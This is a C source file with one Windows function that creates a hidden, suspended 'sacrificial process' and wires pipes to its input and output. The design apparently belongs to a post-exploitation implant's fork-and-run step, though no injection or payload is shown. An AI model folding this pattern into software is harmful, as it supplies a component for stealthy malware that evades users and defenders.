#define _CRT_SECURE_NO_WARNINGS
#include "main.h"
#include "structs.h"




/*-------------------------------------
  Create a sacrificial process, along
  with two pipes for communication
-------------------------------------*/
BOOL CreateProc(PPROCESS_INFORMATION pProcInfo, HANDLE* pStdInWritePipe, HANDLE* pStdOutReadPipe) {

	STARTUPINFO sInfo = { 0 };
	HANDLE stdInRead = NULL,     // Handle for reading from the input pipe. This is located on the parent's end of the read pipe.	
		stdInWrite = NULL,       // Handle for writing to the input pipe. This is located on the child's end of the write pipe.
		stdOutRead = NULL,       // Handle for reading from the output pipe. This is located on the child's end of the read pipe
		stdOutWrite = NULL;      // Handle for writing to the output pipe. This is located on the parent's end of the write pipe.
	WCHAR commandLine[MAX_PATH];
	SECURITY_ATTRIBUTES secAttr = { 0 };

	secAttr.bInheritHandle = TRUE;
	secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	secAttr.lpSecurityDescriptor = NULL;


	WDEBUG_PRINT(L"[*] Spawning sacrificial process:\n\t> image: %s\n", SPAWN_PROCESS);

	//Zero out 
	mymemcpy(pProcInfo, NULL, sizeof(PROCESS_INFORMATION));
	mymemcpy(&sInfo, NULL, sizeof(STARTUPINFO));

	DEBUG_PRINT("\t> creating pipes for process communication\n");
	if (!CreatePipe(&stdInRead, &stdInWrite, &secAttr, 0)) {
		DEBUG_PRINT("[!] Create pipe1 failed: %d\n", GetLastError());
		return FALSE;
	}

	if (!CreatePipe(&stdOutRead, &stdOutWrite, &secAttr, 0)) {
		DEBUG_PRINT("[!] Create pipe2 failed: %d\n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("\t> initializing the startup information.\n");
	sInfo.cb = sizeof(STARTUPINFO);
	sInfo.dwFlags |= (STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES);
	sInfo.wShowWindow = SW_HIDE;
	sInfo.hStdInput = stdInRead;
	sInfo.hStdOutput = sInfo.hStdError = stdOutWrite;

	//Prepare the commandLine argument with the process Image and any arguments specified
	wcsncpy(commandLine, SPAWN_PROCESS, MAX_PATH - 1);         // the process's image
	wcsncat(commandLine, L" ", 1);                             // a space to separate image from arguments
	wcsncat(commandLine, PROCESS_ARGS, wcslen(PROCESS_ARGS));  // add the process arguments
	commandLine[MAX_PATH - 1] = L'\0'; 

	if (!CreateProcessW(NULL, commandLine, &secAttr, NULL, TRUE, (CREATE_SUSPENDED | CREATE_NEW_CONSOLE), NULL, L"C:\\Windows\\System32", &sInfo, pProcInfo)) {
		DEBUG_PRINT("[!] Failed creating process: %d\n", GetLastError());
		return FALSE;
	}

	//Populate the pipe handles that will be used to get the output
	DEBUG_PRINT("\t> process created with pid: %d\n", pProcInfo->dwProcessId);
	*pStdInWritePipe = stdInWrite;
	*pStdOutReadPipe = stdOutRead;

	//Close the pipe handles to prevent blocking the parent process
	NtAPIs.pNtClose(stdInRead);
	NtAPIs.pNtClose(stdOutWrite);

	return TRUE;
}
